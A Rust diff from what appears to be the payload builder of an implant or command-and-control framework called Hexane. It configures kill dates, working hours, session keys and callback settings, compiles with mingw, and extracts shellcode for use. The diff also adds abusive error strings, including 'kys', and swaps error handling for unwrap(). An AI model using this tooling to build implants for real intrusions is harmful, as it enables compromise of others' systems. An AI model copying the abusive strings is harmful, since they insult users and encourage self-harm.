@@ -4,15 +4,16 @@ use std::str::FromStr;
 use rand::Rng;
 
 use crate::stream::Stream;
-use crate::{log_debug, log_info};
 use crate::cipher::{crypt_create_key, crypt_xtea};
 use crate::binary::{copy_section_data, embed_section_data};
-use crate::rstatic::{DEBUG_FLAGS, RELEASE_FLAGS, USERAGENT};
 use crate::utils::{canonical_path_all, generate_definitions, generate_hashes, generate_includes, generate_object_path, normalize_path, run_command};
+use crate::rstatic::{DEBUG_FLAGS, RELEASE_FLAGS, USERAGENT};
 
 use crate::types::Hexane;
-use crate::error::Result as Result;
-use crate::error::Error::Custom as Custom;
+use crate::interface::wrap_message;
+
+use crate::error::Result;
+use crate::error::Error::Custom;
 
 use crate::types::NetworkType::Http as HttpType;
 use crate::types::NetworkOptions::Http as HttpOpt;
@@ -23,9 +24,8 @@ impl Hexane {
     pub(crate) fn setup_build(&mut self) -> Result<()> {
         let mut rng = rand::thread_rng();
 
-        self.compiler_cfg.build_directory = format!("./payload/{}", self.builder_cfg.output_name);
         self.peer_id = rng.gen::<u32>();
-        self.group_id = 0;
+        self.compiler_cfg.build_directory = format!("./payload/{}", self.builder_cfg.output_name);
 
         let compiler_flags = if self.main_cfg.debug {
             DEBUG_FLAGS.parse().unwrap()
@@ -36,10 +36,16 @@ impl Hexane {
 
         self.compiler_cfg.flags = compiler_flags;
 
+        wrap_message("info", "creating build directory");
         fs::create_dir_all(&self.compiler_cfg.build_directory)?;
+
+        wrap_message("info", "generating hashes");
         generate_hashes("./configs/strings.txt", "./core/include/names.hpp")?;
 
+        wrap_message("info", "creating patch");
         self.create_config_patch()?;
+
+        wrap_message("info", "compiling sources");
         self.compile_sources()?;
 
         Ok(())
@@ -57,6 +63,8 @@ impl Hexane {
         }
 
         self.config = patch;
+        wrap_message("info", "patch created successfully");
+
         Ok(())
     }
 
@@ -68,22 +76,18 @@ impl Hexane {
                 stream.pack_string(module);
             }
         } else {
-            log_debug!(&"no external module names found. continue.".to_owned());
+            wrap_message("debug", "no external module names found. continue.");
         }
 
         let working_hours = self.main_cfg.working_hours
             .as_ref()
-            .map_or(
-                Ok(0),
-                |hours| i32::from_str(hours)
-                    .map_err(|e| Custom(format!("create_binary_patch:: {e}")))
-            )?;
+            .map_or(Ok(0), |hours| i32::from_str(hours))
+            .unwrap();
 
         let kill_date = self.main_cfg.killdate
             .as_ref()
-            .map_or(
-                Ok(0), |date| i64::from_str(date)
-                    .map_err(|e| Custom(format!("create_binary_patch:: {e}"))))?;
+            .map_or(Ok(0), |date| i64::from_str(date))
+            .unwrap();
 
         stream.pack_bytes(&self.session_key);
         stream.pack_string(&self.main_cfg.hostname);
@@ -135,7 +139,10 @@ impl Hexane {
                         .as_str());
                 }
 
-                _ => return Err(Custom("create_binary_patch: unknown network type".to_string()))
+                _ => {
+                    wrap_message("error", "create_binary_patch: unknown network type");
+                    return Err(Custom("fuck off".to_string()))
+                }
             }
         }
 
@@ -151,6 +158,7 @@ impl Hexane {
         let entries         = canonical_path_all(src_path)?;
 
         for path in entries {
+            wrap_message("info", format!("gathering: {:?}", path.to_str()).as_str());
             let source = normalize_path(path
                 .to_str()
                 .unwrap()
@@ -173,7 +181,8 @@ impl Hexane {
                     command.push_str(format!(" -f win64 {} -o {}", source, object).as_str());
 
                     if let Err(e) = run_command(command.as_str(), "compiler_error") {
-                        return Err(Custom(format!("compile_sources:: {e}")));
+                        wrap_message("error", format!("compile_sources:: {e}").as_str());
+                        return Err(Custom("fuck off".to_string()));
                     }
                     components.push(object);
                 }
@@ -184,7 +193,7 @@ impl Hexane {
             }
         }
 
-        log_info!(&"linking final objects".to_string());
+        wrap_message("info", "linking final objects");
 
         self.run_mingw(components)?;
         self.extract_shellcode()?;
@@ -198,6 +207,8 @@ impl Hexane {
 
         let definitions     = generate_definitions(main_cfg, network_cfg);
         let mut includes    = String::new();
+
+        includes.push_str("-I\"../\"");
 
         if let Some(dirs) = &self.builder_cfg.include_directories {
             includes = generate_includes(dirs);
@@ -223,7 +234,7 @@ impl Hexane {
                 .to_string();
 
             linker = normalize_path(path);
-            linker = format!(" -T {} ", linker);
+            linker = format!(" -T\"{}\" ", linker);
         }
 
         let flags   = self.compiler_cfg.flags.clone();
@@ -239,7 +250,8 @@ impl Hexane {
         let command = format!("x86_64-w64-mingw32-g++ {} -o {}.exe", params.join(" "), output);
 
         if let Err(e) = run_command(command.as_str(), "linker_error") {
-            return Err(Custom(format!("compile_sources:: {e}")));
+            wrap_message("error", format!("linker_error {e}").as_str());
+            return Err(Custom("go fuck yourself".to_string()));
         }
 
         Ok(())
@@ -258,11 +270,14 @@ impl Hexane {
         shellcode.push_str("/shellcode.bin");
 
         if let Err(e) = copy_section_data(&format!("{}.exe", embed_target), shellcode.as_str(), ".text") {
-            return Err(Custom(format!("compile_sources:: {e}")));
+            wrap_message("error", format!("extract_shellcode:: {e}").as_str());
+            return Err(Custom("kys".to_string()));
         }
 
+        wrap_message("info", format!("{} ready to use", shellcode).as_str());
+        // TODO: create option dll loader
+
         Ok(())
-        // todo: extract shellcode
-        // todo: create option dll loader
+
     }
 }
